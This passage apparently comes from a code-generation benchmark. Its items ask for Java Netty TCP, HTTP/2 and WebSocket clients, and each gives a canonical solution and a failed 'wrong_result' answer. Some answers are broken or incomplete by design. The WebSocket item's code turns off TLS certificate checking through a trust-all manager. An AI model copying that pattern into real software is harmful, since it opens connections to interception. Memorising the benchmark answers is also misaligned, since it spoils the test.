    "Instruction": "Task Description: Create a Java class that implements an HTTP/2 client using Netty framework, capable of establishing TCP connections, sending HTTP requests, and handling responses.\n\nClass Description: NettyHttp2Client is a HTTP/2 client implementation using Netty's non-blocking I/O. It manages connection lifecycle, sends HTTP requests, and processes responses through configured handlers.\n\nAttributes:\n- workerGroup: [NioEventLoopGroup] - Manages client-side I/O threads\n- initializer: [Http2ClientInitializer] - Configures the client pipeline with HTTP/2 handlers\n- bootstrap: [Bootstrap] - Configures and manages the TCP client connection\n- channel: [Channel] - Represents the active network connection\n\nMethods:\n- NettyHttp2Client(String host, int port) -> [Constructor] - Initializes the client with target host and port\n- configureBootstrap(String host, int port) -> [void] - Configures the bootstrap with connection parameters\n- connect() -> [void] - Establishes connection to the server\n- sendRequest(URI hostName) -> [void] - Sends HTTP GET request to specified URI\n- disconnect() -> [void] - Closes connection and releases resources\n\nNested Classes:\n- Http2ClientInitializer: [ChannelInitializer<SocketChannel>] - Configures the pipeline for HTTP/2 communication\n- Http2SettingsHandler: [SimpleChannelInboundHandler<Http2Settings>] - Handles HTTP/2 settings negotiation\n- UpgradeRequestHandler: [ChannelInboundHandlerAdapter] - Manages HTTP upgrade to HTTP/2\n- UserEventLogger: [ChannelInboundHandlerAdapter] - Logs channel events",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.ChannelPromise;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.DefaultFullHttpRequest;\nimport io.netty.handler.codec.http.FullHttpRequest;\nimport io.netty.handler.codec.http.FullHttpResponse;\nimport io.netty.handler.codec.http.HttpClientCodec;\nimport io.netty.handler.codec.http.HttpClientUpgradeHandler;\nimport io.netty.handler.codec.http.HttpHeaderNames;\nimport io.netty.handler.codec.http.HttpHeaderValues;\nimport io.netty.handler.codec.http.HttpMethod;\nimport io.netty.handler.codec.http.HttpVersion;\nimport io.netty.handler.codec.http2.DefaultHttp2Connection;\nimport io.netty.handler.codec.http2.DefaultHttp2FrameReader;\nimport io.netty.handler.codec.http2.DefaultHttp2FrameWriter;\nimport io.netty.handler.codec.http2.DelegatingDecompressorFrameListener;\nimport io.netty.handler.codec.http2.Http2ClientUpgradeCodec;\nimport io.netty.handler.codec.http2.Http2Connection;\nimport io.netty.handler.codec.http2.Http2FrameLogger;\nimport io.netty.handler.codec.http2.Http2FrameReader;\nimport io.netty.handler.codec.http2.Http2FrameWriter;\nimport io.netty.handler.codec.http2.Http2InboundFrameLogger;\nimport io.netty.handler.codec.http2.Http2OutboundFrameLogger;\nimport io.netty.handler.codec.http2.Http2Settings;\nimport io.netty.handler.codec.http2.HttpConversionUtil;\nimport io.netty.handler.codec.http2.HttpToHttp2ConnectionHandler;\nimport io.netty.handler.codec.http2.HttpToHttp2ConnectionHandlerBuilder;\nimport io.netty.handler.codec.http2.InboundHttp2ToHttpAdapterBuilder;\nimport io.netty.handler.logging.LogLevel;\nimport java.net.URI;\nimport java.util.concurrent.TimeUnit;\n\npublic class NettyHttp2Client {\n\n    private final EventLoopGroup workerGroup;\n    private final Http2ClientInitializer initializer;\n    private final Bootstrap bootstrap;\n    private Channel channel;\n\n    public NettyHttp2Client(String host, int port) {\n        this.workerGroup = new NioEventLoopGroup();\n        this.initializer = new Http2ClientInitializer(Integer.MAX_VALUE);\n        this.bootstrap = new Bootstrap();\n        configureBootstrap(host, port);\n    }\n\n    private void configureBootstrap(String host, int port) {\n        bootstrap.group(workerGroup)\n                .channel(NioSocketChannel.class)\n                .option(ChannelOption.SO_KEEPALIVE, true)\n                .remoteAddress(host, port)\n                .handler(initializer);\n    }\n\n    public void connect() {\n        channel = bootstrap.connect().syncUninterruptibly().channel();\n        Http2SettingsHandler http2SettingsHandler = initializer.settingsHandler();\n        http2SettingsHandler.awaitSettings(5, TimeUnit.SECONDS);\n    }\n\n    public void sendRequest(URI hostName) throws Exception {\n        HttpResponseHandler responseHandler = initializer.responseHandler();\n        int streamId = 3;\n        final ChannelPromise promise = channel.newPromise();\n        responseHandler.put(streamId, promise);\n        FullHttpRequest request = new DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.GET, hostName.toString());\n        request.headers().add(HttpHeaderNames.HOST, hostName);\n        request.headers().add(HttpHeaderNames.ACCEPT_ENCODING, HttpHeaderValues.GZIP);\n        request.headers().add(HttpHeaderNames.ACCEPT_ENCODING, HttpHeaderValues.DEFLATE);\n        channel.writeAndFlush(request);\n        promise.await(10, TimeUnit.SECONDS);\n    }\n\n    public void disconnect() {\n        if (channel != null) {\n            channel.close().syncUninterruptibly();\n        }\n        workerGroup.shutdownGracefully();\n    }\n\n    static class Http2ClientInitializer extends ChannelInitializer<SocketChannel> {\n        private static final Http2FrameLogger logger = new Http2FrameLogger(LogLevel.INFO, Http2ClientInitializer.class);\n        private final int maxContentLength;\n        private HttpToHttp2ConnectionHandler connectionHandler;\n        private HttpResponseHandler responseHandler;\n        private Http2SettingsHandler settingsHandler;\n\n        Http2ClientInitializer(int maxContentLength) {\n            this.maxContentLength = maxContentLength;\n        }\n\n        @Override\n        public void initChannel(SocketChannel ch) throws Exception {\n            final Http2Connection connection = new DefaultHttp2Connection(false);\n            connectionHandler = new HttpToHttp2ConnectionHandlerBuilder()\n                    .connection(connection)\n                    .frameListener(new DelegatingDecompressorFrameListener(connection,\n                            new InboundHttp2ToHttpAdapterBuilder(connection)\n                                    .maxContentLength(maxContentLength)\n                                    .propagateSettings(true)\n                                    .build()))\n                    .build();\n            responseHandler = new HttpResponseHandler();\n            settingsHandler = new Http2SettingsHandler(ch.newPromise());\n            configureClearText(ch);\n        }\n\n        public HttpResponseHandler responseHandler() {\n            return responseHandler;\n        }\n\n        public Http2SettingsHandler settingsHandler() {\n            return settingsHandler;\n        }\n\n        protected void configureEndOfPipeline(ChannelPipeline pipeline) {\n            pipeline.addLast(settingsHandler, responseHandler);\n        }\n\n        private void configureClearText(SocketChannel ch) {\n            HttpClientCodec sourceCodec = new HttpClientCodec();\n            Http2ClientUpgradeCodec upgradeCodec = new Http2ClientUpgradeCodec(connectionHandler);\n            HttpClientUpgradeHandler upgradeHandler = new HttpClientUpgradeHandler(sourceCodec, upgradeCodec, 65536);\n            ch.pipeline().addLast(sourceCodec, upgradeHandler, new UpgradeRequestHandler(), new UserEventLogger());\n        }\n\n        private static Http2FrameReader frameReader() {\n            return new Http2InboundFrameLogger(new DefaultHttp2FrameReader(), logger);\n        }\n\n        private static Http2FrameWriter frameWriter() {\n            return new Http2OutboundFrameLogger(new DefaultHttp2FrameWriter(), logger);\n        }\n\n        private final class UpgradeRequestHandler extends ChannelInboundHandlerAdapter {\n            @Override\n            public void channelActive(ChannelHandlerContext ctx) throws Exception {\n                DefaultFullHttpRequest upgradeRequest =\n                        new DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.GET, \"/sdf\");\n                upgradeRequest.headers().add(\"Host\", \"default\");\n                ctx.writeAndFlush(upgradeRequest);\n                ctx.fireChannelActive();\n                ctx.pipeline().remove(this);\n                configureEndOfPipeline(ctx.pipeline());\n            }\n        }\n\n        private static class UserEventLogger extends ChannelInboundHandlerAdapter {\n            @Override\n            public void userEventTriggered(ChannelHandlerContext ctx, Object evt) throws Exception {\n                ctx.fireUserEventTriggered(evt);\n            }\n        }\n    }\n\n    static class Http2SettingsHandler extends SimpleChannelInboundHandler<Http2Settings> {\n        private final ChannelPromise promise;\n\n        Http2SettingsHandler(ChannelPromise promise) {\n            this.promise = promise;\n        }\n\n        public void awaitSettings(long timeout, TimeUnit unit) throws Exception {\n            if (!promise.awaitUninterruptibly(timeout, unit)) {\n                throw new IllegalStateException(\"Timed out waiting for settings\");\n            }\n            if (!promise.isSuccess()) {\n                throw new RuntimeException(promise.cause());\n            }\n        }\n\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, Http2Settings msg) throws Exception {\n            promise.setSuccess();\n            ctx.pipeline().remove(this);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class NettyHttp2Client {\n    private final String host;\n    private final int port;\n    private final EventLoopGroup workerGroup;\n    private final Http2ClientInitializer initializer;\n    private final Bootstrap bootstrap;\n    private Channel channel;\n\n    public NettyHttp2Client(String host, int port) {\n        this.host = host;\n        this.port = port;\n        workerGroup = new NioEventLoopGroup();\n        initializer = new Http2ClientInitializer();\n        bootstrap = new Bootstrap();\n        configureBootstrap(host, port);\n    }\n\n    public void configureBootstrap(String host, int port) {\n        bootstrap.group(workerGroup)\n                .channel(NioSocketChannel.class)\n                .handler(initializer);\n    }\n\n    public void connect() {\n        bootstrap.connect(host, port).addListener((ChannelFuture future) -> {\n            if (future.isSuccess()) {\n                channel = future.channel();\n            } else {\n                future.cause().printStackTrace();\n            }\n        });\n    }\n\n    public void sendRequest(URI hostName) {\n        Http2Headers headers = new DefaultHttp2Headers(HttpMethod.GET, hostName.getPath());\n        headers.host(hostName.getHost());\n        headers.scheme(\"https\");\n        headers.path(hostName.getPath());\n        channel.writeAndFlush(headers);\n    }\n\n    public void disconnect() {\n        if (channel != null) {\n            channel.close().syncUninterruptibly();\n        }\n        workerGroup.shutdownGracefully();\n    }\n\n    static class Http2ClientInitializer extends ChannelInitializer<SocketChannel> {\n        @Override\n        protected void initChannel(SocketChannel ch) {\n            ChannelPipeline pipeline = ch.pipeline();\n            pipeline.addLast(new UpgradeRequestHandler());\n            pipeline.addLast(new Http2SettingsHandler());\n            pipeline.addLast(new UserEventLogger());\n            pipeline.addLast(new Http2ClientHandler());\n        }\n    }\n\n    static class Http2SettingsHandler extends SimpleChannelInboundHandler<Http2Settings> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, Http2Settings settings) {\n            // Handle settings negotiation\n        }\n    }\n\n    static class UpgradeRequestHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            // Handle HTTP/2 upgrade\n        }\n    }\n\n    static class UserEventLogger extends ChannelInboundHandlerAdapter {\n        @Override\n        public void userEventTriggered(ChannelHandlerContext ctx, Object evt) {\n            if (evt instanceof ChannelActiveEvent) {\n                System.out.println(\"Channel active\");\n            } else if (evt instanceof ChannelInactiveEvent) {\n                System.out.println(\"Channel inactive\");\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 149,
    "Instruction": "Task Description: Create a Java class that implements a Netty-based TCP client capable of establishing WebSocket connections with support for SSL/TLS, SOCKS proxy, message compression, and idle connection handling.\n\nClass Description: The NettyTcpClient class provides functionality to connect to a WebSocket server using Netty's asynchronous event-driven network framework. It handles connection establishment, SSL/TLS encryption, proxy configuration, message processing, and graceful shutdown.\n\nAttributes:\n- LOG: Logger - Logger instance for logging events and errors\n- uri: URI - The target WebSocket server URI\n- webSocketChannel: Channel - The active WebSocket channel\n- eventLoopGroup: NioEventLoopGroup - Manages client-side I/O threads\n- compressedMessages: boolean - Flag for enabling message compression\n- acceptAllCertificates: boolean - Flag for accepting all SSL certificates\n- enableLoggingHandler: boolean - Flag for enabling Netty's logging handler\n- loggingHandlerLevel: LogLevel - Logging level for Netty's logging handler\n- socksProxyHost: String - SOCKS proxy host address\n- socksProxyPort: Integer - SOCKS proxy port number\n\nMethods:\n- connect(): void - Establishes a WebSocket connection to the specified URI with configured options\n- disconnect(): void - Closes the WebSocket connection and releases resources\n- getWebSocketClientExtensionHandler(): WebSocketClientExtensionHandler -> WebSocketClientExtensionHandler - Returns the WebSocket extension handler (defaults to compression handler)\n- getWebSocketClientHandler(WebSocketClientHandshaker, WebSocketClientHandler.WebSocketMessageHandler): WebSocketClientHandler -> WebSocketClientHandler - Creates and returns a custom WebSocket client handler with ping/pong and channel state management",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelHandlerContext;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.ChannelPipeline;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.DefaultHttpHeaders;\nimport io.netty.handler.codec.http.HttpClientCodec;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.websocketx.WebSocketClientHandshaker;\nimport io.netty.handler.codec.http.websocketx.WebSocketClientHandshakerFactory;\nimport io.netty.handler.codec.http.websocketx.WebSocketVersion;\nimport io.netty.handler.codec.http.websocketx.extensions.WebSocketClientExtensionHandler;\nimport io.netty.handler.codec.http.websocketx.extensions.compression.WebSocketClientCompressionHandler;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.proxy.Socks5ProxyHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslContextBuilder;\nimport io.netty.handler.ssl.util.InsecureTrustManagerFactory;\nimport io.netty.handler.timeout.IdleState;\nimport io.netty.handler.timeout.IdleStateEvent;\nimport io.netty.handler.timeout.IdleStateHandler;\nimport io.netty.util.internal.SocketUtils;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nimport java.net.URI;\nimport java.time.Duration;\n\npublic class NettyTcpClient {\n\n    private static final Logger LOG = LoggerFactory.getLogger(NettyTcpClient.class);\n    private static final Duration DEFAULT_CONNECTION_TIMEOUT = Duration.ofSeconds(10);\n    private static final int DEFAULT_IDLE_TIMEOUT = 15;\n\n    private URI uri;\n    private Channel webSocketChannel;\n    private NioEventLoopGroup eventLoopGroup;\n    private boolean compressedMessages = false;\n    private boolean acceptAllCertificates = false;\n    private boolean enableLoggingHandler = false;\n    private LogLevel loggingHandlerLevel = LogLevel.DEBUG;\n    private String socksProxyHost;\n    private Integer socksProxyPort;\n\n    public void connect() {\n        try {\n            String scheme = uri.getScheme() == null ? \"ws\" : uri.getScheme();\n            String host = uri.getHost();\n            if (host == null) {\n                throw new IllegalArgumentException(\"Host cannot be null.\");\n            }\n\n            final int port = uri.getPort() == -1 ? \n                (\"ws\".equalsIgnoreCase(scheme) ? 80 : 443) : uri.getPort();\n\n            final boolean ssl = \"wss\".equalsIgnoreCase(scheme);\n            final SslContext sslCtx = ssl ? \n                SslContextBuilder.forClient()\n                    .trustManager(acceptAllCertificates ? InsecureTrustManagerFactory.INSTANCE : null)\n                    .build() : null;\n\n            WebSocketClientHandler handler = getWebSocketClientHandler(\n                WebSocketClientHandshakerFactory.newHandshaker(\n                    uri, WebSocketVersion.V13, null, true, new DefaultHttpHeaders(), 65536),\n                message -> {});\n\n            if (eventLoopGroup == null || eventLoopGroup.isShutdown()) {\n                eventLoopGroup = new NioEventLoopGroup(2);\n            }\n\n            new Bootstrap()\n                .group(eventLoopGroup)\n                .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, \n                    (int) DEFAULT_CONNECTION_TIMEOUT.toMillis())\n                .option(ChannelOption.SO_KEEPALIVE, true)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ChannelPipeline p = ch.pipeline();\n                        if (socksProxyHost != null) {\n                            p.addLast(new Socks5ProxyHandler(\n                                SocketUtils.socketAddress(socksProxyHost, socksProxyPort)));\n                        }\n                        if (sslCtx != null) {\n                            p.addLast(sslCtx.newHandler(ch.alloc(), host, port));\n                        }\n                        p.addLast(new HttpClientCodec());\n                        if (enableLoggingHandler) {\n                            p.addLast(new LoggingHandler(loggingHandlerLevel));\n                        }\n                        if (compressedMessages) {\n                            p.addLast(WebSocketClientCompressionHandler.INSTANCE);\n                        }\n                        p.addLast(new HttpObjectAggregator(8192));\n                        if (DEFAULT_IDLE_TIMEOUT > 0) {\n                            p.addLast(new IdleStateHandler(DEFAULT_IDLE_TIMEOUT, 0, 0));\n                        }\n                        WebSocketClientExtensionHandler clientExtensionHandler = \n                            getWebSocketClientExtensionHandler();\n                        if (clientExtensionHandler != null) {\n                            p.addLast(clientExtensionHandler);\n                        }\n                        p.addLast(handler);\n                    }\n                })\n                .connect(uri.getHost(), port)\n                .addListener((ChannelFuture channelFuture) -> {\n                    webSocketChannel = channelFuture.channel();\n                    if (!channelFuture.isSuccess()) {\n                        LOG.error(\"Connection failed\", channelFuture.cause());\n                    }\n                });\n        } catch (Exception e) {\n            LOG.error(\"Connection error\", e);\n        }\n    }\n\n    public void disconnect() {\n        if (webSocketChannel != null) {\n            webSocketChannel.close();\n        }\n        if (eventLoopGroup != null) {\n            eventLoopGroup.shutdownGracefully(2, DEFAULT_IDLE_TIMEOUT, TimeUnit.SECONDS);\n        }\n    }\n\n    protected WebSocketClientExtensionHandler getWebSocketClientExtensionHandler() {\n        return WebSocketClientCompressionHandler.INSTANCE;\n    }\n\n    protected WebSocketClientHandler getWebSocketClientHandler(\n        WebSocketClientHandshaker handshaker,\n        WebSocketClientHandler.WebSocketMessageHandler handler) {\n        return new WebSocketClientHandler(handshaker, handler) {\n            @Override\n            public void channelInactive(ChannelHandlerContext ctx) {\n                LOG.info(\"Channel inactive\");\n                ctx.close();\n            }\n\n            @Override\n            public void userEventTriggered(ChannelHandlerContext ctx, Object evt) {\n                if (evt instanceof IdleStateEvent) {\n                    IdleStateEvent e = (IdleStateEvent) evt;\n                    if (e.state() == IdleState.READER_IDLE) {\n                        ctx.writeAndFlush(new PingWebSocketFrame());\n                    }\n                }\n            }\n        };\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.handler.codec.http.HttpClientCodec;\nimport io.netty.handler.codec.http.HttpObjectAggregator;\nimport io.netty.handler.codec.http.websocketx.WebSocketClientHandshaker;\nimport io.netty.handler.codec.http.websocketx.WebSocketClientHandshakerFactory;\nimport io.netty.handler.codec.http.websocketx.WebSocketExtension;\nimport io.netty.handler.codec.http.websocketx.WebSocketClientExtensionHandler;\nimport io.netty.handler.proxy.SocksProxyHandler;\nimport io.netty.handler.ssl.SslContext;\nimport io.netty.handler.ssl.SslHandler;\nimport io.netty.handler.logging.LogLevel;\nimport io.netty.handler.logging.LoggingHandler;\nimport io.netty.handler.codec.http.websocketx.WebSocketFrame;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport java.net.URI;\nimport java.security.cert.X509Certificate;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.TrustManager;\nimport javax.net.ssl.X509TrustManager;\n\npublic class NettyTcpClient {\n    private final Logger LOG;\n    private final URI uri;\n    private Channel webSocketChannel;\n    private final EventLoopGroup eventLoopGroup;\n    private boolean compressedMessages;\n    private boolean acceptAllCertificates;\n    private boolean enableLoggingHandler;\n    private LogLevel loggingHandlerLevel;\n    private String socksProxyHost;\n    private Integer socksProxyPort;\n\n    public NettyTcpClient(URI uri, boolean compressedMessages, boolean acceptAllCertificates, boolean enableLoggingHandler, LogLevel loggingHandlerLevel, String socksProxyHost, Integer socksProxyPort) {\n        this.LOG = LoggerFactory.getLogger(NettyTcpClient.class);\n        this.uri = uri;\n        this.compressedMessages = compressedMessages;\n        this.acceptAllCertificates = acceptAllCertificates;\n        this.enableLoggingHandler = enableLoggingHandler;\n        this.loggingHandlerLevel = loggingHandlerLevel;\n        this.socksProxyHost = socksProxyHost;\n        this.socksProxyPort = socksProxyPort;\n        this.eventLoopGroup = new NioEventLoopGroup();\n    }\n\n    public void connect() {\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(eventLoopGroup)\n                .channel(NioEventLoopGroup.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        ch.pipeline().addLast(enableLoggingHandler ? new LoggingHandler(loggingHandlerLevel) : null);\n                        if (socksProxyHost != null && socksProxyPort != null) {\n                            ch.pipeline().addLast(new SocksProxyHandler(socksProxyHost, socksProxyPort));\n                        }\n                        if (acceptAllCertificates) {\n                            SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n                            TrustManager[] trustAllCerts = new TrustManager[] {\n                                new X509TrustManager() {\n                                    public void checkClientTrusted(X509Certificate[] chain, String authType) {}\n                                    public void checkServerTrusted(X509Certificate[] chain, String authType) {}\n                                    public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }\n                                }\n                            };\n                            sslContext.init(null, trustAllCerts, null);\n                            ch.pipeline().addLast(sslContext.newHandler(ch.alloc()));\n                        }\n                        WebSocketClientHandshaker handshaker = WebSocketClientHandshakerFactory.newHandshaker(uri, null);\n                        if (handshaker == null) {\n                            handshaker = WebSocketClientHandshakerFactory.newHandshaker(uri, WebSocketClientHandshakerFactory.getSupportedProtocols());\n                        }\n                        handshaker.setExtensions(compressedMessages ? new WebSocketClientExtensionHandler(new WebSocketExtension(\"permessage-deflate\")) : null);\n                        ch.pipeline().addLast(handshaker);\n                        ch.pipeline().addLast(getWebSocketClientExtensionHandler());\n                        ch.pipeline().addLast(getWebSocketClientHandler(handshaker, new WebSocketClientHandler()));\n                    }\n                });\n        ChannelFuture future = bootstrap.connect(uri.getHost(), uri.getPort()).sync();\n        webSocketChannel = future.channel();\n        future.addListener((ChannelFutureListener) future1 -> {\n            if (future1.isSuccess()) {\n                LOG.info(\"Connected to WebSocket server at {}\", uri);\n            } else {\n                LOG.error(\"Failed to connect to WebSocket server\", future1.cause());\n            }\n        });\n    }\n\n    public void disconnect() {\n        if (webSocketChannel != null && webSocketChannel.isOpen()) {\n            webSocketChannel.close().awaitUninterruptibly();\n            eventLoopGroup.shutdownGracefully();\n        }\n    }\n\n    public WebSocketClientExtensionHandler getWebSocketClientExtensionHandler() {\n        return compressedMessages ? new WebSocketClientExtensionHandler(new WebSocketExtension(\"permessage-deflate\")) : null;\n    }\n\n    public WebSocketClientHandler getWebSocketClientHandler(WebSocketClientHandshaker handshaker, WebSocketClientHandler.WebSocketMessageHandler messageHandler) {\n        return new WebSocketClientHandler(messageHandler, handshaker) {\n            @Override\n            public void userEventTriggered(ChannelHandlerContext ctx, Object evt) throws Exception {\n                if (evt instanceof WebSocketFrame) {\n                    if (((WebSocketFrame) evt).getType() == WebSocketFrame.Type.PING) {\n                        ctx.writeAndFlush(new WebSocketFrame(WebSocketFrame.Type.PONG, ctx.channel().read()))\n                                .addListener((ChannelFutureListener) future -> {\n                                    if (!future.isSuccess()) {\n                                        LOG.warn(\"Failed to send PONG frame\");\n                                    }\n                                });\n                    }\n                } else if (evt instanceof io.netty.handler.timeout.IdleStateEvent) {\n                    ctx.channel().close();\n                }\n                super.userEventTriggered(ctx, evt);\n            }\n        };\n    }\n}"
  },
  {
    "Task_id": 150,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish a connection with a remote server and handle echo messages.\n\nClass Description: The EchoClient class is a Netty-based TCP client that connects to a specified host and port, and handles incoming and outgoing messages through a custom handler. It manages network resources and ensures proper cleanup.\n\nAttributes:\n- host: String - The hostname or IP address of the remote server to connect to\n- port: int - The port number of the remote server to connect to\n\nMethods:\n- EchoClient(String host, int port) -> None - Constructor that initializes the client with target host and port\n- start() -> void - Initializes and starts the Netty client, establishes connection to the remote server, and manages the connection lifecycle. Throws Exception if any error occurs during the process",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport java.net.InetSocketAddress;\n\npublic class EchoClient {\n    private final String host;\n    private final int port;\n\n    public EchoClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n                .channel(NioSocketChannel.class)\n                .remoteAddress(new InetSocketAddress(host, port))\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    public void initChannel(SocketChannel ch) throws Exception {\n                        ch.pipeline().addLast(new EchoClientHandler());\n                    }\n                });\n            ChannelFuture f = b.connect().sync();\n            f.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully().sync();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class EchoClient {\n    private final String host;\n    private final int port;\n\n    public EchoClient(String host, int port) {\n        this.host = host;\n        this.port = port;\n    }\n\n    public void start() throws Exception {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(group)\n                     .channel(NioSocketChannel.class)\n                     .handler(new ChannelInitializer<Channel>() {\n                         @Override\n                         protected void initChannel(Channel ch) throws Exception {\n                             ch.pipeline().addLast(new EchoClientHandler());\n                         }\n                     })\n                     .remoteAddress(host, port);\n\n            ChannelFuture future = bootstrap.connect().sync();\n            future.channel().closeFuture().sync();\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n\n    private static class EchoClientHandler extends SimpleChannelInboundHandler<ByteBuf> {\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, ByteBuf msg) {\n            ctx.write(msg);\n            msg.release();\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 154,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to connect to a remote server, send messages from standard input, and handle file operations.\n\nClass Description: The FileClient class establishes a TCP connection to a specified host and port using Netty's non-blocking I/O. It configures the client pipeline with string encoders/decoders and a custom handler for file operations. The client continuously reads input from the console and sends it to the server.\n\nAttributes:\nhost: String - The hostname or IP address of the remote server to connect to\nport: int - The port number of the remote server\ndest: String - The destination path for file operations (used by the client handler)\n\nMethods:\nrun(): void - throws InterruptedException, IOException - Main method that initializes the Netty client, establishes connection, and handles message sending\n  - Input: None\n  - Output: None (but may throw InterruptedException or IOException)\n  \nFileClient(String, int, String) - Constructor that initializes the client with connection parameters\n  - Input:\n    - host: String - Server hostname/IP\n    - port: int - Server port\n    - dest: String - File destination path\n  - Output: FileClient instance (constructor)",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.string.StringDecoder;\nimport io.netty.handler.codec.string.StringEncoder;\nimport io.netty.util.CharsetUtil;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\n\npublic class FileClient {\n\n    private String host;\n    private int port;\n    private String dest;\n\n    public FileClient(String host, int port, String dest) {\n        this.host = host;\n        this.port = port;\n        this.dest = dest;\n    }\n\n    public void run() throws InterruptedException, IOException {\n        EventLoopGroup workerGroup = new NioEventLoopGroup();\n\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(workerGroup);\n            b.channel(NioSocketChannel.class);\n            b.option(ChannelOption.SO_KEEPALIVE, true);\n            b.handler(new ChannelInitializer<SocketChannel>() {\n                @Override\n                public void initChannel(SocketChannel ch) throws Exception {\n                    ch.pipeline().addLast(\"encoder\", new StringEncoder(CharsetUtil.UTF_8));\n                    ch.pipeline().addLast(\"decoder\", new StringDecoder(CharsetUtil.UTF_8));\n                    ch.pipeline().addLast(new FileClientHandler(dest));\n                }\n            });\n\n            ChannelFuture f = b.connect(host, port).sync();\n            Channel channel = f.channel();\n\n            BufferedReader in = new BufferedReader(new InputStreamReader(System.in));\n            while (true) {\n                channel.writeAndFlush(in.readLine() + \"\\r\\n\");\n            }\n        } finally {\n            workerGroup.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class FileClient {\n    private String host;\n    private int port;\n    private String dest;\n\n    public FileClient(String host, int port, String dest) {\n        this.host = host;\n        this.port = port;\n        this.dest = dest;\n    }\n\n    public void run() throws InterruptedException, IOException {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(group)\n                     .channel(NioSocketChannel.class)\n                     .handler(new ChannelInitializer<SocketChannel>() {\n                         @Override\n                         protected void initChannel(SocketChannel ch) {\n                             ChannelPipeline pipeline = ch.pipeline();\n                             pipeline.addLast(new StringEncoder());\n                             pipeline.addLast(new StringDecoder());\n                             pipeline.addLast(new FileClientHandler());\n                         }\n                     });\n\n            ChannelFuture future = bootstrap.connect(host, port).sync();\n            Channel channel = future.channel();\n\n            new Thread(() -> {\n                try (BufferedReader reader = new BufferedReader(new InputStreamReader(System.in))) {\n                    String line;\n                    while ((line = reader.readLine()) != null) {\n                        